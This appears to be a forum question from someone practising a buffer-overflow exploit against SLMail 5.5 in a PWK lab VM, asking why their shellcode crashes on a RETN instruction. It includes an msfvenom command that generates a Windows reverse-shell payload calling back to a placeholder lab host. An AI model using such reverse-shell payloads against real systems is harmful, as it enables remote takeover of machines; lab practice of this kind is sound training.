Even Google doesn't know what this error means. The last command causing program termination is\n  <code>\n   C3\n  </code>\n  , or opcode\n  <code>\n   RETN\n  </code>\n  , so it must have something to do with the stack. This op, that is causing the crash is part of my shell code, which I have generated as follows:\n </p>\n <pre><code>msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<PWK VM IP> LPORT=443 -b '\\x00\\x0a\\x0d' -f c \n</code></pre>\n <p>\n  The SLMail is a default setup of 5.5 on a 32-bit windows 7 VM. I've been stuck here for over a week, so\n  <em>\n   please\n  </em>\n  do help as much as possible.\n </p>\n</div>\n</body></html>",
